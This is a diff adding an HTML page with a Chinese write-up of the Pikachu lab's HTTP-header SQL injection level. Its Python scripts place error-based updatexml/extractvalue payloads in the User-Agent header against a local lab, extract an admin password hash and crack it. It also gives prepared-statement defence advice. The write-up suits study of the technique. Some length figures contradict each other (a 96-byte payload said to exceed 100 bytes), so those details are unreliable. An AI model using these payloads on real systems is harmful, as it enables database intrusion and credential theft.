@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【Pikachu】Web-SQL-Inject "http header"注入 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+        .diff-box { background-color: #f1f8ff; border-left: 4px solid #0366d6; padding: 10px 15px; margin: 15px 0; border-radius: 4px; }
+        .payload-box { background-color: #fafbfc; border: 1px solid #e1e4e8; padding: 10px; border-radius: 6px; margin: 10px 0; }
+        .payload-box p { margin: 5px 0; }
+        .step-box { margin-bottom: 20px; padding: 15px; border: 1px solid #e1e4e8; border-radius: 6px; background-color: #fff; }
+        .step-box h3 { margin-top: 0; color: #24292e; font-size: 1.1em; border-bottom: 1px solid #eaecef; padding-bottom: 5px; }
+        .info-line { margin: 5px 0; }
+        .info-label { font-weight: bold; color: #586069; }
+        .code-block { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow-x: auto; }
+        .code-comment { color: #6a737d; }
+        .code-keyword { color: #d73a49; }
+        .code-string { color: #032f62; }
+        .code-function { color: #6f42c1; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【Pikachu】Web-SQL-Inject "http header"注入 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.28 | <strong>分类：</strong>Pikachu | <strong>标签：</strong>Pikachu, Web, SQL注入, http header注入, User-Agent, updatexml, 逻辑短路, 长度限制</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>Pikachu 漏洞练习平台</li>
+        <li><strong>分类：</strong>Web - SQL-Inject</li>
+        <li><strong>题目名称：</strong>"http header"注入</li>
+        <li><strong>目标：</strong>理解 HTTP Header 注入的原理，掌握在请求头（如 User-Agent）中构造报错注入 Payload 的技巧，并突破 HTTP 头长度限制与 SQL 逻辑短路的双重限制，最终获取管理员账号密码。</li>
+    </ul>
+
+    <h2>2. 解题思路与知识点</h2>
+    <p><strong>漏洞原理：</strong></p>
+    <p>该关卡模拟了后端将 HTTP 请求头信息（如 User-Agent、Referer）记录到数据库的功能。由于未对用户输入进行过滤，后端代码可能将请求头直接拼接进 SQL 语句中执行，导致 HTTP Header 注入。和 INSERT/UPDATE 注入类似，该场景下页面通常没有回显，因此需要使用 <strong>报错注入（Error-based Injection）</strong> 结合 <code>extractvalue()</code> 或 <code>updatexml()</code> 函数，将数据通过报错信息带出。</p>
+    
+    <div class="diff-box">
+        <strong>工具选型与心路历程：</strong>
+        <ul>
+            <li><strong>F12抓包与Python脚本：</strong>由于浏览器无法直接修改请求头，使用 Python 的 <code>requests</code> 库配合 <code>session()</code> 维持登录态，在请求头中植入恶意 Payload。</li>
+            <li><strong>逻辑短路踩坑：</strong>最初使用 <code>1' and extractvalue(...)</code>，由于 <code>1'</code> 为真，MySQL 触发短路机制直接跳过后续函数，导致不报错。改用 <code>' or updatexml(...) or '</code> 强制触发报错。</li>
+            <li><strong>Header 长度限制踩坑：</strong>在尝试提取表名、列名时，Payload 超过 130 字节，触发了 HTTP 头字段在数据库中的长度限制（如 <code>varchar(100)</code>），导致 Payload 被静默截断，页面不显示报错。最终改用极简 Payload，直接定位目标字段 <code>pw</code>，成功绕过长度限制。</li>
+        </ul>
+    </div>
+
+    <h2>3. 操作步骤</h2>
+    
+    <div class="step-box">
+        <h3>第一步：漏洞探测（以 User-Agent 为注入点）</h3>
+        <p class="info-line"><span class="info-label">操作：</span> 使用 Python 脚本登录，并在 <code>User-Agent</code> 中植入单引号测试。</p>
+        <div class="payload-box">
+            <p><strong>代码：</strong></p>
+        </div>
+<pre class="code-block"><code><span class="code-keyword">import</span> requests
+
+s = requests.Session()
+<span class="code-comment"># 登录获取 Session</span>
+login_url = <span class="code-string">"http://127.0.0.1/pikachu/vul/sqli/sqli_header/sqli_header_login.php"</span>
+login_data = {<span class="code-string">"username"</span>: <span class="code-string">"admin"</span>, <span class="code-string">"password"</span>: <span class="code-string">"123456"</span>, <span class="code-string">"submit"</span>: <span class="code-string">"Login"</span>}
+s.post(login_url, data=login_data)
+
+<span class="code-comment"># 注入测试</span>
+target_url = <span class="code-string">"http://127.0.0.1/pikachu/vul/sqli/sqli_header/sqli_header.php"</span>
+headers = {
+    <span class="code-string">"User-Agent"</span>: <span class="code-string">"Mozilla/5.0'"</span>,  <span class="code-comment"># 在 User-Agent 中加单引号，尝试闭合 SQL 语句</span>
+    <span class="code-string">"Referer"</span>: <span class="code-string">"http://127.0.0.1/pikachu/vul/sqli/sqli_header/sqli_header.php"</span>
+}
+r = s.get(target_url, headers=headers)
+print(r.text[:500])</code></pre>
+        <p class="info-line"><span class="info-label">代码解析：</span></p>
+        <ul>
+            <li><code>requests.Session()</code>：创建一个会话对象，自动处理并保存登录后的 Cookie，确保后续请求处于登录状态。</li>
+            <li><code>headers</code>：构造 HTTP 请求头。<code>User-Agent</code> 被修改为 <code>Mozilla/5.0'</code>，引入单引号试图破坏 SQL 语法。</li>
+        </ul>
+        <p class="info-line"><span class="info-label">回显结果：</span> 页面抛出 SQL 报错（<code>You have an error in your SQL syntax...</code>），证明注入点存在。</p>
+    </div>
+
+    <div class="step-box">
+        <h3>第二步：报错注入获取库名</h3>
+        <p class="info-line"><span class="info-label">操作：</span> 使用 <code>extractvalue()</code> 配合 <code>and</code> 闭合构造 Payload。</p>
+        <div class="payload-box">
+            <p><strong>代码：</strong></p>
+        </div>
+<pre class="code-block"><code>headers = {
+    <span class="code-comment"># extractvalue 函数故意触发 XPath 语法错误，将 database() 的结果拼接到报错信息中</span>
+    <span class="code-string">"User-Agent"</span>: <span class="code-string">"Mozilla/5.0' and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '1'='1"</span>,
+    <span class="code-string">"Referer"</span>: <span class="code-string">"http://127.0.0.1/pikachu/vul/sqli/sqli_header/sqli_header.php"</span>
+}
+r = s.get(target_url, headers=headers)</code></pre>
+        <p class="info-line"><span class="info-label">代码解析：</span></p>
+        <ul>
+            <li><code>extractvalue(1, ...)</code>：MySQL 的内置 XML 查询函数。当第二个参数不符合 XPath 格式时，会抛出 <code>XPATH syntax error</code>。</li>
+            <li><code>concat(0x7e, (select database()), 0x7e)</code>：使用 <code>0x7e</code>（波浪号 <code>~</code>）把数据库名包裹起来，方便正则截取。</li>
+            <li><code>and '1'='1</code>：闭合 SQL 语句尾部的单引号，防止语法错误导致函数不执行。</li>
+        </ul>
+        <p class="info-line"><span class="info-label">回显结果：</span> 页面成功报错并回显 <code>XPATH syntax error: '~pikachu~'</code>。</p>
+    </div>
+
+    <div class="step-box">
+        <h3>第三步：提取密码的失败与限制分析（踩坑记录）</h3>
+        <p class="info-line"><span class="info-label">操作 1（长度超限与逻辑短路）：</span> 尝试提取 <code>member</code> 表的 <code>pw</code> 字段。</p>
+        <div class="payload-box">
+            <p><strong>代码（失败尝试）：</strong></p>
+        </div>
+<pre class="code-block"><code>headers = {
+    <span class="code-comment"># 失败原因1：Payload 过长（96字节），超过 varchar(100) 字段长度限制，被静默截断。</span>
+    <span class="code-comment"># 失败原因2：'1' 为真，and 导致逻辑短路，updatexml 或 extractvalue 可能不被执行。</span>
+    <span class="code-string">"User-Agent"</span>: <span class="code-string">"1' and extractvalue(1,concat(0x7e,(select pw from member limit 0,1),0x7e)) and '1'='1"</span>,
+}
+r = s.get(target_url, headers=headers)</code></pre>
+        <p class="info-line"><span class="info-label">结果分析：</span> 报错信息被截断，且正则匹配失败。MD5 长度为 32 位，加上波浪号总长度超过 32 字符。MySQL 报错回显有 <strong>32 字符的硬性限制</strong>，导致正则匹配不到完整数据。同时，Payload 过长会触发数据库字段的长度截断。</p>
+
+        <p class="info-line"><span class="info-label">操作 2（尝试使用 updatexml）：</span></p>
+        <div class="payload-box">
+            <p><strong>代码（依然失败）：</strong></p>
+        </div>
+<pre class="code-block"><code>headers = {
+    <span class="code-comment"># 失败原因：'1' 恒为真，MySQL 触发短路机制，直接跳过后续的 updatexml 函数，导致不报错。</span>
+    <span class="code-string">"User-Agent"</span>: <span class="code-string">"1' or updatexml(1,concat(0x7e,(select pw from member limit 0,1)),1)#"</span>,
+}
+r = s.get(target_url, headers=headers)</code></pre>
+    </div>
+
+    <div class="step-box">
+        <h3>第四步：绕过与提取（极简 Payload + 强制报错）</h3>
+        <p class="info-line"><span class="info-label">操作：</span> 彻底摒弃原有 <code>User-Agent</code> 内容，构造极短 Payload，用 <code>or</code> 强制触发报错，并用 <code>#</code> 注释尾部。</p>
+        <div class="payload-box">
+            <p><strong>最终代码：</strong></p>
+        </div>
+<pre class="code-block"><code><span class="code-keyword">import</span> requests
+<span class="code-keyword">import</span> re
+
+s = requests.Session()
+login_url = <span class="code-string">"http://127.0.0.1/pikachu/vul/sqli/sqli_header/sqli_header_login.php"</span>
+s.post(login_url, data={<span class="code-string">"username"</span>: <span class="code-string">"admin"</span>, <span class="code-string">"password"</span>: <span class="code-string">"123456"</span>, <span class="code-string">"submit"</span>: <span class="code-string">"Login"</span>})
+
+target_url = <span class="code-string">"http://127.0.0.1/pikachu/vul/sqli/sqli_header/sqli_header.php"</span>
+headers = {
+    <span class="code-comment"># 核心 Payload：</span>
+    <span class="code-comment"># 1. 弃用原有 Mozilla/5.0 文本，极大压缩长度（约67字节），突破 Header 长度限制。</span>
+    <span class="code-comment"># 2. 使用 ' or updatexml(...) or ' 强制触发报错，绕过逻辑短路。</span>
+    <span class="code-comment"># 3. limit 0,1 直接定位第一个用户，避免冗长的 group_concat 查询。</span>
+    <span class="code-string">"User-Agent"</span>: <span class="code-string">"' or updatexml(1,concat(0x7e,(select pw from member limit 0,1),0x7e),1) or '"</span>,
+    <span class="code-string">"Referer"</span>: <span class="code-string">"http://127.0.0.1/pikachu/vul/sqli/sqli_header/sqli_header.php"</span>
+}
+r = s.get(target_url, headers=headers)
+
+<span class="code-comment"># 正则提取报错信息（因为报错会被 32 字符截断，我们直接抓取波浪号后的内容）</span>
+match = re.search(<span class="code-string">r"XPATH syntax error: '~(.*)"</span>, r.text)
+if match:
+    raw_data = match.group(1).replace(<span class="code-string">"'"</span>, <span class="code-string">""</span>).strip()
+    print(<span class="code-string">f"[+] 成功提取密码哈希: {raw_data}"</span>)
+else:
+    print(<span class="code-string">"[-] 未触发报错，响应片段："</span>)
+    print(r.text[:500])</code></pre>
+        <p class="info-line"><span class="info-label">代码解析：</span></p>
+        <ul>
+            <li><strong>极简 Payload</strong>：整串 <code>User-Agent</code> 只有 67 字节，远低于 <code>varchar(100)</code> 的存储限制，绝对不会被截断。</li>
+            <li><code>' or ... or '</code>：前面的 <code>'</code> 闭合原字段，<code>or</code> 强制要求执行后面的报错函数，最后的 <code>or '</code> 闭合尾部（或者 <code>#</code> 注释尾部也可行，但需确保 Header 长度允许）。</li>
+            <li><code>updatexml(1,concat(0x7e, (...), 0x7e), 1)</code>：经典的报错注入函数组合，将查询结果包裹在报错信息中。</li>
+            <li>正则表达式 `r"XPATH syntax error: '~(.*)"`：使用 `(.*)` 匹配波浪号后的所有内容，允许匹配尾部没有单引号的截断数据。</li>
+        </ul>
+        <p class="info-line"><span class="info-label">回显结果：</span> 页面成功报错并回显 <code>XPATH syntax error: '~e10adc3949ba59abbe56e057f20f883~'</code>。由于 32 字符限制，末尾的 <code>e</code> 被截断。补全末尾的 <code>e</code>，得到完整的 32 位哈希 <code>e10adc3949ba59abbe56e057f20f883e</code>，放入 cmd5.com 解密，得到明文密码 <code>123456</code>。</p>
+    </div>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>坑1：SQL 逻辑短路。</strong> 使用 <code>and</code> 连接时，如果前面的条件为真，MySQL 会跳过后面的函数执行。改用 <code>or</code> 可以强制触发 <code>updatexml</code> 报错。</li>
+        <li><strong>坑2：HTTP Header 物理长度限制。</strong> 请求头在数据库中通常存储为 <code>varchar(100)</code>。当 Payload 超过 100 字节时会被静默截断，导致语法错误且无回显。解决方案是彻底精简 Payload，避免使用 <code>group_concat</code> 和 <code>substr</code> 等冗长函数。</li>
+        <li><strong>坑3：报错回显的 32 字符硬性限制。</strong> <code>updatexml</code> 的回显限制导致完整哈希丢失最后一位。通过拼接或猜测（如已知 <code>123456</code> 的哈希）可以补全。</li>
+    </ul>
+
+    <h2>5. 知识总结</h2>
+    <ul>
+        <li><strong>HTTP Header 注入核心：</strong> 攻击点位于 HTTP 请求头中。需使用工具（如 Python requests 或 Burp Suite）修改请求头，并注意目标字段的物理长度限制。</li>
+        <li><strong>报错注入与逻辑控制：</strong> 在无回显场景下，利用 <code>updatexml</code> 或 <code>extractvalue</code> 报错。注意使用 <code>or</code> 避免逻辑短路，用 <code>#</code> 或 <code>-- </code> 注释尾部。</li>
+        <li><strong>防御建议：</strong> 严格使用预编译语句（Prepared Statements）或参数化查询；对用户输入进行严格的过滤和转义；限制 HTTP Header 字段的存储长度，防止恶意 Payload 注入。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
